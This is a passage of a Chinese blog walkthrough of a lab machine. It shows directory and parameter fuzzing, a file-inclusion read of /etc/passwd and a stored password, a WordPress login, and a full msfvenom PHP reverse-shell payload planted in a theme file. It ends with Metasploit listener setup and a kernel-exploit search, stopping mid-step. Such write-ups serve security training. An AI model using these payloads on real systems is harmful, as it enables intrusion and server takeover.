http://192.168.110.139/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-admin/js/                                                                      </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-admin/maint/                                                                   </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-admin/network/                                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-admin/user/                                                                    </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-content/ ----</span><br><span class="line">+ http://192.168.110.139/wordpress/wp-content/index.php (CODE:200|SIZE:0)                                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-content/plugins/                                                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-content/themes/                                                                </span><br><span class="line">==&gt; DIRECTORY: http://192.168.110.139/wordpress/wp-content/uploads/                                                               </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-admin/css/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-admin/images/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-admin/includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-admin/js/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-admin/maint/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-admin/network/ ----</span><br><span class="line">+ http://192.168.110.139/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                                                   </span><br><span class="line">+ http://192.168.110.139/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                                                   </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-admin/user/ ----</span><br><span class="line">+ http://192.168.110.139/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                                                      </span><br><span class="line">+ http://192.168.110.139/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                                                      </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-content/plugins/ ----</span><br><span class="line">+ http://192.168.110.139/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                                                 </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-content/themes/ ----</span><br><span class="line">+ http://192.168.110.139/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)                                                  </span><br><span class="line">                                                                                                                                  </span><br><span class="line">---- Entering directory: http://192.168.110.139/wordpress/wp-content/uploads/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sat Jul 30 22:25:56 2022</span><br><span class="line">DOWNLOADED: 46120 - FOUND: 15</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 挑选出能访问到页面的</span></span><br><span class="line">http://192.168.110.139/dev                                                                               </span><br><span class="line">http://192.168.110.139/index.php</span><br><span class="line">http://192.168.110.139/wordpress</span><br><span class="line">http://192.168.110.139/wordpress/wp-admin/admin.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731103121100.png" alt="image-20220731103121100"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731103211493.png" alt="image-20220731103211493"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731103317254.png" alt="image-20220731103317254"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731103422292.png" alt="image-20220731103422292"></p>
<p>这几个网址目录显示的信息有限，我们采用下一步的精细扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">找到.txt .php .zip后缀的网址</span><br><span class="line">─<span class="comment"># dirb http://192.168.110.139 -X .txt,.php,.zip</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sat Jul 30 22:42:37 2022</span><br><span class="line">URL_BASE: http://192.168.110.139/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">EXTENSIONS_LIST: (.txt,.php,.zip) | (.txt)(.php)(.zip) [NUM = 3]</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.110.139/ ----</span><br><span class="line">+ http://192.168.110.139/image.php (CODE:200|SIZE:147)                                                                            </span><br><span class="line">+ http://192.168.110.139/index.php (CODE:200|SIZE:136)                                                                            </span><br><span class="line">+ http://192.168.110.139/secret.txt (CODE:200|SIZE:412)                                                                           </span><br><span class="line">                                                                                                                                  </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sat Jul 30 22:42:51 2022</span><br><span class="line">DOWNLOADED: 13836 - FOUND: 3</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.110.139/secret.txt</span><br><span class="line">http://192.168.110.139/image.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731104652311.png" alt="image-20220731104652311"></p>
<p>wfuzz 模糊测试：</p>
<p>1.目录扫描</p>
<p>2.找参数    192.168.110.139&#x2F;?&#x3D;value    它能替换<code>？</code>找到对应参数</p>
<p>3.密码爆破   username password</p>
<p>4.找sql xss</p>
<p>5.压力测试</p>
<p>这个网址是留给我们的提示，我们可以使用wfuzz来找到网页的参数</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731104708267.png" alt="image-20220731104708267"></p>
<p><a target="_blank" rel="noopener" href="http://192.168.110.139/index.php?FUZZ">http://192.168.110.139/index.php?FUZZ</a> 爆破出来的参数要替换FUZZ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">爆破出参数太多了需要进行过滤</span><br><span class="line"><span class="comment"># wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -u http://192.168.110.139/index.php?FUZZ</span></span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: http://192.168.110.139/index.php?FUZZ</span></span><br><span class="line"><span class="string">Total requests: 951</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word       Chars       Payload                                                           </span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000000003:   200        7 L      12 W       136 Ch      &quot;01&quot;                                                              </span></span><br><span class="line"><span class="string">000000027:   200        7 L      12 W       136 Ch      &quot;access&quot;                                                          </span></span><br><span class="line"><span class="string">000000026:   200        7 L      12 W       136 Ch      &quot;academic&quot;                                                        </span></span><br><span class="line"><span class="string">000000028:   200        7 L      12 W       136 Ch      &quot;accessgranted&quot;                                                   </span></span><br><span class="line"><span class="string">000000015:   200        7 L      12 W       136 Ch      &quot;2001&quot;                                                            </span></span><br><span class="line"><span class="string">000000001:   200        7 L      12 W       136 Ch      &quot;@&quot;                                                               </span></span><br><span class="line"><span class="string">000000025:   200        7 L      12 W       136 Ch      &quot;about&quot;       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">─# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -u http://192.168.110.139/index.php?FUZZ --hw 12</span></span><br><span class="line"><span class="string"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;</span>s documentation <span class="keyword">for</span> more information.</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.110.139/index.php?FUZZ</span><br><span class="line">Total requests: 951</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                                                           </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000341:   200        7 L      19 W       206 Ch      <span class="string">&quot;file&quot;</span>                                                            </span><br><span class="line"></span><br><span class="line">Total time: 0</span><br><span class="line">Processed Requests: 951</span><br><span class="line">Filtered Requests: 950</span><br><span class="line">Requests/sec.: 0</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://192.168.110.139/index.php?file=">http://192.168.110.139/index.php?file=</a></p>
<p>这有可能是个文件包含漏洞</p>
<p><a target="_blank" rel="noopener" href="http://192.168.110.139/secret.txt">http://192.168.110.139/secret.txt</a> 里面给的提示&#x2F;&#x2F;see the location.txt and you will get your next move&#x2F;&#x2F;</p>
<p>那我们可以写成<a target="_blank" rel="noopener" href="http://192.168.110.139/index.php?file=location.txt">http://192.168.110.139/index.php?file=location.txt</a></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731112000870.png" alt="image-20220731112000870"></p>
<p>用secrettier360替换file作为参数</p>
<p><a target="_blank" rel="noopener" href="http://192.168.110.139/index.php?secrettier360=">http://192.168.110.139/index.php?secrettier360=</a>?</p>
<p>我们尝试看一下&#x2F;etc&#x2F;passwd</p>
<p><a target="_blank" rel="noopener" href="http://192.168.110.139/index.php?secrettier360=/etc/passwd">http://192.168.110.139/index.php?secrettier360=/etc/passwd</a></p>
<p>额！！！访问不了。。。我又看了一下，哦漏了个other php，我们遇到的第二个php是image.php</p>
<p>那么修改网址为<a target="_blank" rel="noopener" href="http://192.168.110.139/image.php?secrettier360=/etc/passwd">http://192.168.110.139/image.php?secrettier360=/etc/passwd</a></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731112512692.png" alt="image-20220731112512692"></p>
<p>nice!!!仔细观察发现一句很特殊的话<code>find password.txt file in my directory:/home/saket</code></p>
<p>那么，我们重新修改url</p>
<p><a target="_blank" rel="noopener" href="http://192.168.110.139/image.php?secrettier360=/home/saket/password.txt">http://192.168.110.139/image.php?secrettier360=/home/saket/password.txt</a></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220731112713007.png" alt="image-20220731112713007"></p>
<p>那么我们在前面，找到了wordpress的登录界面和用户</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801202127526.png" alt="image-20220801202127526"></p>
<p>加上这个密码<code>follow_the_ippsec</code></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801202152244.png" alt="image-20220801202152244"></p>
<p>nice。。。进去了之后我们找个地方写反弹shell，经过一系列乱七八糟的翻找。。。我发现这里可以写入php…那么写入一句话木马好呢，还是写入反弹shell呢！！！这里我用反弹shell。。。</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801202629422.png" alt="image-20220801202629422"></p>
<p>首先我们来到kali生成一个反弹shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lhost是kali的ip，lport是kali的监听端口</span></span><br><span class="line"><span class="comment"># msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.110.135 lport=7777 -o shell.php</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: php from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 1116 bytes</span><br><span class="line">Saved as: shell.php</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># cat shell.php              </span></span><br><span class="line">/*&lt;?php /**/ error_reporting(0); <span class="variable">$ip</span> = <span class="string">&#x27;192.168.110.135&#x27;</span>; <span class="variable">$port</span> = 7777; <span class="keyword">if</span> ((<span class="variable">$f</span> = &#x27;stream_socket_client&#x27;) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(<span class="string">&quot;tcp://&#123;<span class="variable">$ip</span>&#125;:&#123;<span class="variable">$port</span>&#125;&quot;</span>); <span class="variable">$s_type</span> = <span class="string">&#x27;stream&#x27;</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s</span> &amp;&amp; (<span class="variable">$f</span> = <span class="string">&#x27;fsockopen&#x27;</span>) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>); <span class="variable">$s_type</span> = <span class="string">&#x27;stream&#x27;</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s</span> &amp;&amp; (<span class="variable">$f</span> = <span class="string">&#x27;socket_create&#x27;</span>) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(AF_INET, SOCK_STREAM, SOL_TCP); <span class="variable">$res</span> = @socket_connect(<span class="variable">$s</span>, <span class="variable">$ip</span>, <span class="variable">$port</span>); <span class="keyword">if</span> (!<span class="variable">$res</span>) &#123; die(); &#125; <span class="variable">$s_type</span> = <span class="string">&#x27;socket&#x27;</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s_type</span>) &#123; die(<span class="string">&#x27;no socket funcs&#x27;</span>); &#125; <span class="keyword">if</span> (!<span class="variable">$s</span>) &#123; die(<span class="string">&#x27;no socket&#x27;</span>); &#125; switch (<span class="variable">$s_type</span>) &#123; <span class="keyword">case</span> <span class="string">&#x27;stream&#x27;</span>: <span class="variable">$len</span> = fread(<span class="variable">$s</span>, 4); <span class="built_in">break</span>; <span class="keyword">case</span> <span class="string">&#x27;socket&#x27;</span>: <span class="variable">$len</span> = socket_read(<span class="variable">$s</span>, 4); <span class="built_in">break</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$len</span>) &#123; die(); &#125; <span class="variable">$a</span> = unpack(<span class="string">&quot;Nlen&quot;</span>, <span class="variable">$len</span>); <span class="variable">$len</span> = <span class="variable">$a</span>[<span class="string">&#x27;len&#x27;</span>]; <span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>; <span class="keyword">while</span> (strlen(<span class="variable">$b</span>) &lt; <span class="variable">$len</span>) &#123; switch (<span class="variable">$s_type</span>) &#123; <span class="keyword">case</span> <span class="string">&#x27;stream&#x27;</span>: <span class="variable">$b</span> .= fread(<span class="variable">$s</span>, <span class="variable">$len</span>-strlen(<span class="variable">$b</span>)); <span class="built_in">break</span>; <span class="keyword">case</span> <span class="string">&#x27;socket&#x27;</span>: <span class="variable">$b</span> .= socket_read(<span class="variable">$s</span>, <span class="variable">$len</span>-strlen(<span class="variable">$b</span>)); <span class="built_in">break</span>; &#125; &#125; <span class="variable">$GLOBALS</span>[<span class="string">&#x27;msgsock&#x27;</span>] = <span class="variable">$s</span>; <span class="variable">$GLOBALS</span>[<span class="string">&#x27;msgsock_type&#x27;</span>] = <span class="variable">$s_type</span>; <span class="keyword">if</span> (extension_loaded(<span class="string">&#x27;suhosin&#x27;</span>) &amp;&amp; ini_get(<span class="string">&#x27;suhosin.executor.disable_eval&#x27;</span>)) &#123; <span class="variable">$suhosin_bypass</span>=create_function(<span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>); <span class="variable">$suhosin_bypass</span>(); &#125; <span class="keyword">else</span> &#123; <span class="built_in">eval</span>(<span class="variable">$b</span>); &#125; die();     </span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：复制这个反弹shell里面的内容记得不要复制前面的/*</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801204828269.png" alt="image-20220801204828269"></p>
<p>然后左下角保存</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我们建立kali的监听</span></span><br><span class="line">──<span class="params">(root㉿kali)</span>-[~]</span><br><span class="line">└─<span class="comment"># msfconsole                                                                           </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># msf6 &gt; use exploit/multi/handler </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># msf6 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># msf6 exploit(multi/handler) &gt; show options </span></span><br><span class="line"></span><br><span class="line">Module options <span class="params">(exploit/multi/handler)</span>:</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   <span class="params">----</span>  <span class="params">---------------</span>  <span class="params">--------</span>  <span class="params">-----------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options <span class="params">(php/meterpreter/reverse_tcp)</span>:</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   <span class="params">----</span>   <span class="params">---------------</span>  <span class="params">--------</span>  <span class="params">-----------</span></span><br><span class="line">   LHOST                   yes       The listen address <span class="params">(an interface may be specified)</span></span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  <span class="params">----</span></span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># msf6 exploit(multi/handler) &gt; set lhost 192.168.110.135</span></span><br><span class="line">lhost =&gt; 192.168.110.135</span><br><span class="line"><span class="comment"># msf6 exploit(multi/handler) &gt; set lport 7777</span></span><br><span class="line">lport =&gt; 7777</span><br><span class="line"><span class="comment">#msf6 exploit(multi/handler) &gt; exploit </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们无法得知这个脚本的路径怎么办呢？很简单。。。百度那个目标文件的路径或者直接下载一个wordpress看文件不就得了</p>
<p>好了路径是<code>http://192.168.110.139/wordpress/wp-content/themes/twentynineteen/secret.php</code></p>
<p>在浏览器上输入url之后回车，kali就能监听到反弹回来的信息，并且控制www</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801204258071.png" alt="image-20220801204258071"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801205250240.png" alt="image-20220801205250240"></p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801205310719.png" alt="image-20220801205310719"></p>
<p>我们用输入shell来对进入靶机的命令窗口环境</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801205615446.png" alt="image-20220801205615446"></p>
<p>我们可以通过whoami知道现在的用户是web的用户，我们的权限太低了，得想办法提权，我们在前面知道这个ubuntu的系统非常老了，版本在16.04</p>
<p><img src="/2022/11/23/%E6%B8%97%E9%80%8F-and-web/image-20220801205826938.png" alt="image-20220801205826938"></p>
<p>我们通过kali查一下这个系统的漏洞</p>
<p>在msfconsole里面输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; searchsploit 16.04 ubuntu</span><br><span class="line">[*] <span class="built_in">exec</span>: searchsploit 16.04 ubuntu</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                   |  Path</span><br><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Apport 2.x (Ubuntu Desktop 12.10 &lt; 16.04) - Local Code Execution                                 | linux/local/40937.txt</span><br><span class="line">Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                                    | linux/local/40054.c</span><br><span class="line">Google Chrome (Fedora 25 / Ubuntu 16.04) - <span class="string">&#x27;tracker-extract&#x27;</span> / <span class="string">&#x27;gnome-video-thumbnailer&#x27;</span> + <span class="string">&#x27;tote | linux/local/40943.txt</span></span><br><span class="line"><span class="string">LightDM (Ubuntu 16.04/16.10) - &#x27;</span>Guest Account<span class="string">&#x27; Local Privilege Escalation                        | linux/local/41923.txt</span></span><br><span class="line"><span class="string">Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611 | linux_x86-64/local/42275.c</span></span><br><span class="line"><span class="string">Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - &#x27;</span>ldso_dynamic Stac | linux_x86/local/42276.c</span><br><span class="line">Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                            | linux/dos/39773.txt</span><br><span class="line">Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR &amp; SMEP Bypass) Arbitrary File Read        | linux/local/45175.c</span><br><span class="line">Linux Kernel 4.4 (Ubuntu 16.04) - <span class="string">&#x27;BPF&#x27;</span> Local Privilege Escalation (Metasploit)                  | linux/local/40759.rb</span><br><span class="line">Linux Kernel 4.4 (Ubuntu 16.04) - <span class="string">&#x27;snd_timer_user_ccallback()&#x27;</span> Kernel Pointer Leak               | linux/dos/46529.c</span><br><span class="line">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - <span class="string">&#x27;AF_PACKET&#x27;</span> Race Condition Privilege Escalation | linux_x86-64/local/40871.c</span><br><span class="line">Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter <span class="string">&#x27;target_offset&#x27;</span> Out-of-Bounds Privilege Esc | linux_x86-64/local/40049.c</span><br><span class="line">Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x64) - <span class="string">&#x27;AF_PACKET&#x27;</span> Race Condition Privilege | windows_x86-64/local/47170.c</span><br><span class="line">Linux Kernel 4.4.x (Ubuntu 16.04) - <span class="string">&#x27;double-fdput()&#x27;</span> bpf(BPF_PROG_LOAD) Privilege Escalation     | linux/local/39772.txt</span><br><span class="line">Linux Kernel 4.6.2 (Ubuntu 16.04.1) - <span class="string">&#x27;IP6T_SO_SET_REPLACE&#x27;</span> Local Privilege Escalation           | linux/local/40489.txt</span><br><span class="line">Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                                       | linux/dos/45919.c</span><br><span class="line">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                    | linux/local/45010.c</span><br><span class="line">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                           | linux/local/44298.c</span><br><span class="line">Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - <span class="string">&#x27;netfilter target_offset&#x27;</span> Local Privilege Escalatio | linux_x86-64/local/44300.c</span><br><span class="line">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR /  | linux/local/43418.c</span><br><span class="line">Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege  | linux/local/47169.c</span><br><span class="line">------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line"><span class="comment"># 这么多个漏洞，我们发现倒数第5个漏洞Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation有本地提权的能力，我</span></span><br><span class="line">们来到kali的炸弹库拷贝武器，然后编译一下。。。</span><br></pre></td></tr></table></figure>

